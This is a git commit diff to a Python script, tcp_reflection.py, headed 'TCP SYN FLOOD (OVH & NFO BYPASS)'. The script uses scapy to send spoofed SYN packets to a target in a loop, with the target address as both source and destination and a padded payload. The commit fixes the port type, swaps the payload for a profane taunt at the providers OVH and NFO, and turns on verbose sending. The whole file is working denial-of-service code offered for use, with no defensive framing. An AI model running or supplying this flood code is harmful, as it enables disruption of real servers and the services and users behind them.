639fb0f352f8bf6ee4b8168f0a3ef0fa64006826
Weeke <baileydunlap9@gmail.com>
2021-04-08 01:07:54 +0000

    Update tcp_reflection.py

--- tcp_reflection.py
+++ tcp_reflection.py
@@ -1,7 +1,8 @@
+# TCP SYN FLOOD (OVH & NFO BYPASS)
+
 import socket
 from scapy.all import *
 
-# TCP SYN FLOOD (OVH & NFO BYPASS)
 def main():
     count       = 0
 
@@ -12,11 +13,11 @@ def main():
     target_ip   = socket.gethostbyname(target)
 
     for count in range(int(amount)):
-        ip      = IP(src=target_ip, dst=target_ip)
-        tcp     = TCP(sport=RandShort(), dport=target_port, flags="S")
-        raw     = Raw(b"X"*1024)
+        ip      = IP(src=target_ip, dst=target_ip) 
+        tcp     = TCP(sport=RandShort(), dport=int(target_port), flags="S")
+        raw     = Raw(b"Fuck OVH and NFO"*1024)
         p       = ip / tcp / raw
-        send(p, loop=0, verbose=0)
+        send(p, loop=0, verbose=1)
         count   = count + 1
 
 if __name__ == "__main__":
